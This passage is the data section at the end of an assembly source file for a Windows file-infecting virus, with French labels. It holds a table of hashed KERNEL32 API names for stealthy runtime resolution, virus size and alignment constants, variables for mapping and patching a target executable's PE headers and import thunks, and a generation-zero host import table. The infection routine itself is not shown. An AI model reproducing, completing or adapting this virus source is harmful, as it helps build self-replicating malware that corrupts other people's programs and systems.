dd 040bf2f84h		;GetProcAddress
dd 032beddc3h		;MapViewOfFile
dd 08e0e5487h		;SetCurrentDirectoryA
dd 0bc738ae6h		;SetEndOfFile
dd 050665047h		;SetFileAttributesA
dd 06d452a3ah		;SetFilePointer
dd 09f69de76h		;SetFileTime
dd 03a00e23bh		;Sleep
dd 0fae00d65h		;UnmapViewOfFile
dd 0065f101ah		;VirtualProtect
dd 04e5de044h		;ExitThread

NBRE_FCT_K32_VIRUS=($-tab_condense)/4
TAILLE_VIRUS=$-debut_virus

TAILLE_VIRUS_ALIGNE_FICHIER=ALIGNEMENT_FICHIER_STANDARD*((TAILLE_VIRUS+\
ALIGNEMENT_FICHIER_STANDARD-1)/ALIGNEMENT_FICHIER_STANDARD)

TAILLE_VIRUS_ALIGNE_MEMOIRE=ALIGNEMENT_MEMOIRE_STANDARD*((TAILLE_VIRUS+\
ALIGNEMENT_MEMOIRE_STANDARD-1)/ALIGNEMENT_MEMOIRE_STANDARD)


;[Fin du virus]

tab_adr_fct_k32_virus:
CloseHandle								dd 0
CreateFileA								dd 0
CreateFileMappingA							dd 0
CreateMutexA								dd 0
CreateThread								dd 0
FindClose								dd 0
FindFirstFileA								dd 0
FindNextFileA								dd 0
GetDriveTypeA								dd 0
GetLastError								dd 0
GetProcAddress								dd 0
MapViewOfFile								dd 0
SetCurrentDirectoryA							dd 0
SetEndOfFile								dd 0
SetFileAttributesA							dd 0
SetFilePointer								dd 0
SetFileTime								dd 0
Sleep									dd 0
UnmapViewOfFile								dd 0
VirtualProtect								dd 0
ExitThread								dd 0


condense								dd ?
adr_map_IMAGE_OPTIONAL_HEADER_cible					dd ?
adr_map_IMAGE_SECTION_HEADER_cible					dd ?
adr_map_IMAGE_FILE_HEADER_cible						dd ?
adr_map_IMAGE_IMPORT_DESCRIPTOR_cible					dd ?
rva_IMAGE_IMPORT_DESCRIPTOR_cible					dd ?
rva_IMAGE_IMPORT_BY_NAME_cible						dd ?
adr_map_cible								dd ?
thread_id								dd ?
tampon									dd ?
handle_fichier_cible							dd ?
handle_map_cible							dd ?
handle_mutex								dd ?
nbre_octet_libre_sect_code_cible					dd ?
adr_map_espace_libre_sect_data_cible					dd ?
adr_map_espace_libre_sect_code_cible					dd ?
adr_map_1st_thunk_k32_cible						dd ?
adr_map_original_1st_thunk_k32_cible					dd ?
adr_map_loader_sect_code_cible						dd ?

struct_recherche	rb sizeof.WIN32_FIND_DATA
tampon_registre		rd 8

tab_adr_fct_k32_hote:
rd 2		;pour la generation 0









section 'idata' import data readable writeable

;IMAGE_IMPORT_DESCRIPTOR:
dd RVA ID_OriginalFirstThunk_k32,0,0,RVA ID_Name_k32,RVA ID_FirstThunk_k32
dd RVA ID_OriginalFirstThunk_u32,0,0,RVA ID_Name_u32,RVA ID_FirstThunk_u32
dd 0,0,0,0,0

ID_Name_k32	db 'KERNEL32.DLL',0
ID_Name_u32	db 'USER32.DLL',0

ID_OriginalFirstThunk_k32	dd RVA image_import_by_name_k32_00
				dd 0

ID_FirstThunk_k32:
ExitProcess			dd RVA image_import_by_name_k32_00
				dd 0


ID_OriginalFirstThunk_u32	dd RVA image_import_by_name_u32
				dd 0
ID_FirstThunk_u32:
MessageBoxA			dd RVA image_import_by_name_u32
				dd 0

;IMAGE_IMPORT_BY_NAME:
image_import_by_name_k32_00	dw 0
				db 'ExitProcess',0

image_import_by_name_k32_01	dw 0
				db 'Sleep',0


image_import_by_name_u32	dw 0
				db 'MessageBoxA',0





vrai_ID_OriginalFirstThunk_k32:
				dd RVA image_import_by_name_k32_00
				dd RVA image_import_by_name_k32_01
				dd 0
vrai_ID_FirstThunk_k32:
faux_ExitProcess		dd __ExitProcess
faux_Sleep			dd __Sleep
				dd 0
